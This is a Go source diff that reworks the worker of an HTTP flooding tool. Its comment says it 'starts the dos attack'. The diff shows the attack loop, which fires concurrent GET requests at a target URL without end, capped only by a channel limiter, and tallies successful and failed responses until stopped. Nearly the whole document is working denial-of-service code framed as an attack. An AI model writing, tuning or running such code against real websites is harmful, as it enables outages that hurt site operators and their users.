@@ -13,8 +13,9 @@ func (w *Worker) NewWorker() {
 }
 
 // StartWorker starts the dos attack
-func (w *Worker) StartWorker(i *Info, numberOfRequests int, url string) {
-	go w.attack(i, numberOfRequests, url)
+func (w *Worker) StartWorker(info *Info, numberOfRequests int, url string) {
+	w.MaxRequests = make(chan bool, numberOfRequests)
+	go w.attack(info, url)
 }
 
 // StopWorker stops the attack by closing all channels
@@ -22,46 +23,36 @@ func (w *Worker) StopWorker() {
 	close(w.Channel)
 }
 
-func (w *Worker) attack(info *Info, numberOfRequests int, url string) {
-	for i := 0; i < numberOfRequests; i++ {
-		go w.request(info, url)
-	}
+func (w *Worker) attack(info *Info, url string) {
 	for {
 		select {
 		case <-w.Channel:
 			fmt.Println("Worker Stopped: ", w.ID)
 			return
 		default:
-			time.Sleep(time.Millisecond * 10)
+			w.MaxRequests <- true
+			go w.request(info, url)
 		}
 	}
 }
 
 func (w *Worker) request(i *Info, url string) {
-	for {
-		start := time.Now()
-		resp, e := http.Get(url)
-		if e == nil {
-			secs := time.Since(start).Seconds()
-			fmt.Println(secs)
-		}
-
-		i.Requests++
-
-		if e != nil {
-			i.NetworkFailed++
-		} else {
-			if resp.StatusCode == http.StatusOK {
-				i.Success++
-			} else {
-				i.BadFailed++
-			}
-		}
-
-		if w.frequency(1) {
-			return
-		}
+	start := time.Now()
+	resp, e := http.Get(url)
+	if e == nil {
+		secs := time.Since(start).Seconds()
+		fmt.Println(secs)
 	}
+
+	if e != nil {
+		countRequest(i, http.StatusBadRequest, e)
+	} else {
+		countRequest(i, resp.StatusCode, e)
+	}
+	if w.frequency(10) {
+		return
+	}
+	<-w.MaxRequests
 }
 
 func (w *Worker) frequency(wait time.Duration) bool {
@@ -71,5 +62,18 @@ func (w *Worker) frequency(wait time.Duration) bool {
 	default:
 		time.Sleep(wait * time.Millisecond)
 		return false
+	}
+}
+
+func countRequest(i *Info, status int, e error) {
+	i.Requests++
+	if e != nil {
+		i.NetworkFailed++
+		return
+	}
+	if status == http.StatusOK {
+		i.Success++
+	} else {
+		i.BadFailed++
 	}
 }
